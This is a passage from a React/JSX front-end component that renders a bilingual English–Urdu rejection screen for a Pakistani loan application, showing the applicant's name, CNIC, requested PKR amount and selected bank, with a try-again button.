            <span className="bg-rose-100 text-rose-800 text-xs px-3 py-1 rounded-full font-bold inline-block">
              APPLICATION REJECTED / مسترد کر دی گئی
            </span>
            <h3 className="text-2xl font-bold text-gray-900">Loan Application Rejected!</h3>
            <p className="text-xs text-gray-600 font-urdu">
              آپ کی قرض کی درخواست مسترد کر دی گئی ہے۔ براہ کرم درست تفصیلات درج کریں۔
            </p>
            <p className="text-xs text-gray-500">
              Please enter correct details and try again.
            </p>
          </div>

          {/* Receipt Card */}
          <div className="bg-gray-50 rounded-2xl p-6 text-left border border-gray-200 space-y-4">
            <div className="flex justify-between items-center border-b border-gray-200 pb-3">
              <div>
                <span className="text-[10px] font-bold text-gray-400 block tracking-wider">APPLICATION ID</span>
                <span className="font-mono font-bold text-gray-900 text-base">PLP-2026-209158</span>
              </div>
              <div className="text-right">
                <span className="text-[10px] font-bold text-gray-400 block tracking-wider">STATUS</span>
                <span className="bg-rose-100 text-rose-800 text-xs px-2.5 py-0.5 rounded-full font-bold">Rejected / Try Again</span>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4 text-xs">
              <div>
                <span className="text-gray-400 block">Applicant Name</span>
                <span className="font-semibold text-gray-800">{personal.fullName || 'Applicant'}</span>
              </div>
              <div>
                <span className="text-gray-400 block">CNIC Number</span>
                <span className="font-mono font-semibold text-gray-800">{personal.cnic || '42101-9988776-1'}</span>
              </div>
              <div>
                <span className="text-gray-400 block">Requested Loan Amount</span>
                <span className="font-bold text-rose-700 text-sm">PKR {Number(loan.amount || 500000).toLocaleString()}</span>
              </div>
              <div>
                <span className="text-gray-400 block">Selected Bank</span>
                <span className="font-semibold text-gray-800">{loan.bankName || 'Raast'}</span>
              </div>
            </div>
          </div>

          <div className="flex flex-col sm:flex-row gap-3 pt-2">
            <button
              onClick={onCancel}
              className="w-full bg-[#044e3b] hover:bg-[#033b2e] text-white font-semibold py-3.5 px-6 rounded-xl transition text-sm flex items-center justify-center gap-2 shadow-sm"
            >
              <span>Please Try Again / دوبارہ کوشش کریں</span>
              <ArrowRight className="w-4 h-4" />
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
